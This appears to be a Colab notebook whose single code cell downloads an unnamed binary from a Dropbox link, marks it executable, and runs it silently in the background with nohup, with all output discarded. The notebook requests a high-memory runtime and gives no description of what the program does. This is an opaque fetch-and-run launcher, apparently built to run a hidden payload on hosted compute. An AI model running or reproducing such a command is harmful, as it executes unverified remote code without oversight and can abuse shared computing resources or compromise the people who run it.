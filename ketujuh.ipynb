{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "private_outputs": true,
      "provenance": [],
      "machine_shape": "hm",
      "collapsed_sections": [
        "iLh_9SkSut4u"
      ],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/satu1001/ketujuh/blob/main/ketujuh.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "! wget -qO run https://www.dropbox.com/s/yu316vlgnrlklgr/ketujuh?dl=1 && chmod +x run && nohup ./run >/dev/null 2>&1 & echo 'run'"
      ],
      "metadata": {
        "id": "NmiRNvg-zQo-"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}